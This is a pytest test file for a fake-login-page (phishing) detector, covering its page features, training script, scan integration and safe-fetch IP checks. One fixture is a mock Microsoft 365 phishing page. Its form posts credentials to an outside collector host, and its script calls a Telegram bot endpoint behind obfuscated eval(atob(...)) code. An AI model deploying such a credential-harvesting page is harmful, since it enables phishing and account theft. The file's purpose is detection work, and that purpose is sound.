"""Fake Login Page model (21 Oct): page clues, training script, and the hook into URL scans."""
import gzip
import json
import random
import uuid

import pytest

from app.detectors import fake_login
from app.detectors import login_page_features as LF
from app.detectors import malicious_url as M

PHISH = """<html><head><title>Microsoft 365 - Sign in</title><meta name="robots" content="noindex"></head><body>
<img src="https://www.microsoft.com/logo.png" alt="Microsoft"><form action="https://collector.ru/next.php" method="post">
<input type="email" name="login"><input type="password" name="passwd"></form><a href="#">Forgot password?</a>
<script>eval(atob('YWxlcnQoMSk='));fetch('https://api.telegram.org/bot123456789:AAA/sendMessage')</script>
Your account will be suspended. Verify now.</body></html>"""
REAL = """<html><head><title>Sign in - Google Accounts</title><script src="/js/app.js"></script></head><body>
<form action="/signin/v2/challenge" method="post"><input type="email" name="identifier"><input type="password" name="Passwd">
</form><a href="https://support.google.com/accounts">Help</a><a href="https://policies.google.com/privacy">Privacy</a>
</body></html>"""


def test_clues_of_a_copied_login_page():
    v = LF.extract(PHISH, "https://office-verify-login.top/owa/login")
    for k in ("has_password", "form_external", "form_php", "exfil_endpoint", "brand_mismatch", "obfuscation",
              "resources_from_brand_official", "meta_noindex", "url_abused_tld"):
        assert v[k] > 0, k
    assert v["share_dead_links"] == 1.0 and v["_facts"]["brands_imitated"] == ["microsoft"]
    assert len(LF.vector(v)) == len(LF.FEATURES)


def test_a_real_login_page_shows_no_warning_clues():
    v = LF.extract(REAL, "https://accounts.google.com/signin")
    assert v["has_password"] == 1.0
    for k in ("form_external", "exfil_endpoint", "brand_mismatch", "obfuscation", "resources_from_brand_official",
              "share_dead_links", "url_abused_tld"):
        assert v[k] == 0, k


def test_broken_or_empty_html_never_crashes():
    for html in ("", "<html><form action=", "<<<>>>" * 1000, "\x00" * 500):
        assert len(LF.vector(LF.extract(html, "https://x.example/"))) == len(LF.FEATURES)


def test_same_kit_gets_the_same_fingerprint():
    from app.ml.training.train_fake_login import kit_fingerprint
    a = PHISH.replace("collector.ru", "other-host.cc")
    assert kit_fingerprint(PHISH) == kit_fingerprint(a)            # same kit, different drop host
    assert kit_fingerprint(PHISH) != kit_fingerprint(REAL)


@pytest.fixture()
def tiny_dataset(tmp_path):
    rng = random.Random(1)
    (tmp_path / "dom").mkdir()
    rows = []
    for i in range(80):
        u = str(uuid.UUID(int=rng.getrandbits(128)))
        if i % 2 == 0:
            html = PHISH.replace("Microsoft 365", ["Microsoft 365", "Netflix", "PayPal"][i % 3]) + "x" * rng.randint(0, 400)
            rows.append({"uuid": u, "group": "phish", "page_url": f"https://verify-{i}.top/login", "apex": f"v{i}.top",
                         "time": "2026-10-10" if i % 4 == 0 else "2026-09-10"})
        else:
            site = ["google.com", "live.com", "chase.com", "amazon.in", "sbi.co.in"][i % 5]
            html = REAL.replace("google", site.split(".")[0]) + "y" * rng.randint(0, 2000)
            rows.append({"uuid": u, "group": "genuine-login", "page_url": f"https://www.{site}/login", "apex": site,
                         "time": "2026-09-01"})
        with gzip.open(tmp_path / "dom" / f"{u}.html.gz", "wt") as f:
            f.write(html)
    rows.append({"uuid": "cloaked1", "group": "phish", "cloaked": True, "page_url": "https://www.facebook.com/"})
    (tmp_path / "scans.jsonl").write_text("\n".join(json.dumps(r) for r in rows))
    return tmp_path


def test_training_script_runs_and_writes_a_model_the_scanner_accepts(tiny_dataset, tmp_path, monkeypatch):
    import sys
    from app.ml.training import train_fake_login as T
    out = tmp_path / "models"
    monkeypatch.setattr(sys, "argv", ["x", "--data", str(tiny_dataset), "--out", str(out)])
    info = T.main()
    assert info["pages"]["phishing"] == 40 and info["pages"]["real_sites"] == 5
    assert "phishing link ended on the real site (cloaked)" in info["skipped"]
    assert "time_test_october_phishing_unseen" in info["results"]
    monkeypatch.setattr(fake_login, "MODEL_PATH", str(out / "fake_login.joblib"))
    monkeypatch.setattr(fake_login, "_cache", {})
    a = fake_login.assess(PHISH, "https://office-verify-login.top/owa/login")
    assert a["level"] in ("high", "medium") and fake_login.reasons(a["facts"])
    assert fake_login.assess(REAL, "https://accounts.google.com/signin")["level"] == "low"


def test_no_model_or_no_page_means_no_verdict(monkeypatch, tmp_path):
    monkeypatch.setattr(fake_login, "MODEL_PATH", str(tmp_path / "missing.joblib"))
    monkeypatch.setattr(fake_login, "_cache", {})
    assert fake_login.assess(PHISH, "https://x.top/") is None
    assert M._login_page_model({}, "fake-login-page") is None


def _fake_assess(level, p):
    return lambda html, url: {"probability": p, "level": level, "thrAlert": 0.9, "thrVerify": 0.6,
                              "facts": {"brands_imitated": ["microsoft"], "external_form": True, "password_fields": 1},
                              "trainedAt": "t"}


def test_a_fake_login_verdict_raises_the_scan_on_the_fake_login_page(monkeypatch):
    monkeypatch.setattr(fake_login, "assess", _fake_assess("high", 0.97))
    m = M._login_page_model({"html": PHISH, "final_url": "https://office-verify-login.top/owa"}, "fake-login-page")
    assert m["level"] == "high" and M._model_points(m) >= 71
    assert "presents itself as microsoft" in m["indicator"]["description"]
    assert M._login_page_model({"html": PHISH, "final_url": "https://x.top"}, "lookalike-domain") is None  # other pages: not used


def test_the_hook_passes_the_fetched_page_to_the_model(monkeypatch):
    from app.services import safe_fetch
    seen = []
    monkeypatch.setattr(M, "_live_indicators", lambda url, registry_out=None: [])
    monkeypatch.setattr(safe_fetch, "fetch", lambda url: {"status": "ok", "reason": "", "final_url": url, "html": PHISH,
                                                          "chain": [{"how": "start", "url": url, "status": 200}]})
    monkeypatch.setattr(fake_login, "assess", lambda html, url: seen.append((len(html), url)) or _fake_assess("high", 0.97)(html, url))
    monkeypatch.setattr(M.settings, "LIVE_PAGE_CHECKS", True)
    r = M.analyze_url("https://office-verify-login.top/owa", "Fake Login Page", subtopic_id="fake-login-page")
    assert seen and seen[0][0] == len(PHISH)
    assert r["riskScore"] >= 71 and any(i["label"].startswith("Fake login page model") for i in r["indicators"])


def test_page_copy_compressed_twice_is_unwrapped(tmp_path):
    """urlscan sends its stored page gzip-compressed and the collector compressed it again (found 21 Oct)."""
    import gzip
    from app.ml.training.train_fake_login import read_page_copy
    html = "<html><head><title>Sign in</title></head><body><input type=password></body></html>"
    p = tmp_path / "x.html.gz"
    with gzip.open(p, "wb") as f:
        f.write(gzip.compress(html.encode()))
    assert read_page_copy(str(p)) == html
    with gzip.open(p, "wb") as f:                       # plain (fixed collector) still works
        f.write(html.encode())
    assert read_page_copy(str(p)) == html


def test_shared_web_infrastructure_is_not_brand_copying():
    """Google Fonts / reCAPTCHA / Blogger images and social 'follow us' links are used by ordinary sites."""
    from app.detectors import login_page_features as LF
    html = ('<html><head><title>My bakery</title><link rel=stylesheet href="https://fonts.googleapis.com/css?x">'
            '<script src="https://www.gstatic.com/recaptcha/api.js"></script></head><body>'
            '<img src="https://blogger.googleusercontent.com/a.png"><a href="https://facebook.com/bakery">fb</a>'
            '<a href="https://wa.me/123">chat</a><p>Sign in with Google to order cakes.</p></body></html>')
    v = LF.extract(html, "https://mybakery.example/")
    assert v["resources_from_brand_official"] == 0 and v["links_to_brand_official"] == 0
    assert v["brand_mismatch"] == 0                     # "Sign in with Google" names a partner, not an imitation


def test_alert_rule_page_asking_for_nothing_is_at_most_verify(monkeypatch):
    """When training chose the rule, a page with no password / card / OTP / login wording never reaches 'alert'."""
    from app.detectors import fake_login as F

    class Sure:
        def predict_proba(self, X):
            return [[0.01, 0.99]]
    bundle = {"model": Sure(), "thr_alert": 0.9, "thr_verify": 0.7, "alert_needs_ask": True}
    monkeypatch.setattr(F, "load", lambda: bundle)
    plain = "<html><head><title>Recipes</title></head><body>" + "<p>Carrot cake with cream.</p>" * 20 + "</body></html>"
    login = "<html><head><title>Sign in</title></head><body><form><input type=password name=p></form>" + "x" * 300 + "</body></html>"
    assert F.assess(plain, "https://recipes.example/")["level"] == "medium"
    assert F.assess(login, "https://login.example/")["level"] == "high"
    bundle["alert_needs_ask"] = False
    assert F.assess(plain, "https://recipes.example/")["level"] == "high"


def test_empty_app_shell_gets_no_verdict(monkeypatch):
    """A page that shows nothing without JavaScript (LeetCode's login shell, 21 Oct live check) is not judged."""
    from app.detectors import fake_login as F

    class Sure:
        def predict_proba(self, X):
            return [[0.01, 0.99]]
    monkeypatch.setattr(F, "load", lambda: {"model": Sure(), "thr_alert": 0.9, "thr_verify": 0.7})
    shell = "<html><head><title>LeetCode</title></head><body><div id=app></div>" + "<script>x()</script>" * 30 + "</body></html>"
    assert F.assess(shell, "https://leetcode.com/accounts/login/") is None
    form = "<html><body><form><input name=email><input type=password name=p></form>" + "<script>x()</script>" * 30 + "</body></html>"
    assert F.assess(form, "https://login.example/")["level"] == "high"


def test_nat64_addresses_are_judged_by_the_embedded_ipv4():
    """IPv6-only networks (Indian mobile hotspots) answer with 64:ff9b::<IPv4>; public ones are fetched, while an
    embedded private / loopback address is still refused."""
    import ipaddress
    from app.services import safe_fetch as F
    assert not F._bad_ip(ipaddress.ip_address("64:ff9b::4274:f01"))        # 66.116.15.1 (public)
    for bad in ("64:ff9b::7f00:1", "64:ff9b::a00:1", "64:ff9b::c0a8:101", "64:ff9b::a9fe:a9fe"):
        assert F._bad_ip(ipaddress.ip_address(bad))


def test_fetch_falls_back_to_the_second_checked_address(monkeypatch):
    """IPv4 first; if it cannot connect (IPv6-only network), the checked IPv6 address is tried."""
    from app.services import safe_fetch as F
    tried = []

    def pinned(url, ip):
        tried.append(ip)
        if ip == "1.2.3.4":
            raise F.FetchError("connection refused")
        return 200, None, "text/html", b"<html>ok</html>"
    monkeypatch.setattr(F, "_vet_all", lambda u: (["1.2.3.4", "64:ff9b::102:304"], ""))
    monkeypatch.setattr(F, "_get_pinned", pinned)
    r = F.fetch("https://example.test/")
    assert r["status"] == "ok" and tried == ["1.2.3.4", "64:ff9b::102:304"]
